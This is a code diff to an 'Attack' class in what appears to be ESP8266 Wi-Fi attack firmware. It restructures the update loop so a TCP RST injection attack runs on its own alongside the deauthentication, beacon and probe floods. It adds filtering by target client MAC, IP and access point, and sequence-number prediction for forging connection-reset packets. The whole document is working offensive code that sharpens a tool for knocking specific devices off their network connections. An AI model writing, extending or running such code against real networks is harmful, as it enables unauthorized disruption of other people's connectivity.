@@ -154,27 +154,29 @@ String Attack::getStatusJSON() {
 }
 
 void Attack::update() {
-    if (!running || scan.isScanning()) return;
+    if ((!running && !rst.active) || scan.isScanning()) return;
 
     apCount = accesspoints.count();
     stCount = stations.count();
     nCount  = names.count();
 
-    // run/update all attacks
-    deauthUpdate();
-    deauthAllUpdate();
-    beaconUpdate();
-    probeUpdate();
-    updateRST();
+    if (running) {
+        // run/update all attacks
+        deauthUpdate();
+        deauthAllUpdate();
+        beaconUpdate();
+        probeUpdate();
 
-    // each second
-    if (currentTime - attackTime > 1000) {
-        attackTime = currentTime; // update time
-        updateCounter();
+        // each second
+        if (currentTime - attackTime > 1000) {
+            attackTime = currentTime; // update time
+            updateCounter();
 
-        if (output) status();     // status update
-        getRandomMac(mac);        // generate new random mac
+            if (output) status();     // status update
+            getRandomMac(mac);        // generate new random mac
+        }
     }
+    updateRST();
 }
 
 void Attack::deauthUpdate() {
@@ -474,6 +476,7 @@ uint32_t Attack::getPacketRate() {
 }
 
 void Attack::startRST(uint32_t timeout) {
+    if (target.client_ip == 0) return;
     rst.active  = true;
     rst.time    = currentTime;
     rst.start   = currentTime;
@@ -486,20 +489,41 @@ void Attack::stopRST() {
 
 void Attack::updateRST() {
     if (!rst.active) return;
+    if (target.client_ip == 0) {
+        stopRST();
+        return;
+    }
     if ((rst.timeout > 0) && (currentTime - rst.start > rst.timeout)) {
         stopRST();
         return;
     }
     if (currentTime - rst.time < 100) return; // 100ms rate
     rst.time = currentTime;
+    int ap_index = accesspoints.find(target.ap_id);
+    uint8_t* ap_mac = NULL;
+    if (ap_index >= 0) ap_mac = accesspoints.getMac(ap_index);
     int c = scan.connectionCount();
     for (int i = 0; i < c; i++) {
         connection_info ci = scan.getConnection(i);
+        bool macMatch = (memcmp(ci.src_mac, target.client_mac, 6) == 0) ||
+                                (memcmp(ci.dst_mac, target.client_mac, 6) == 0);
+        bool ipMatch = (ci.src_ip == target.client_ip) || (ci.dst_ip == target.client_ip);
+        bool apMatch = true;
+        if (ap_mac) {
+            apMatch = (memcmp(ci.src_mac, ap_mac, 6) == 0) ||
+                      (memcmp(ci.dst_mac, ap_mac, 6) == 0);
+        }
+        if (!(macMatch && ipMatch && apMatch)) continue;
         float dt = float(currentTime - ci.ts);
         uint32_t seq = ci.seq + uint32_t(ci.seq_rate * dt);
         sendRSTPacket(ci, seq);
     }
 }
+
+bool Attack::isRSTRunning() {
+    return rst.active;
+}
+
 
 bool Attack::sendRSTPacket(const connection_info& ci, uint32_t seq) {
     uint8_t buf[96];
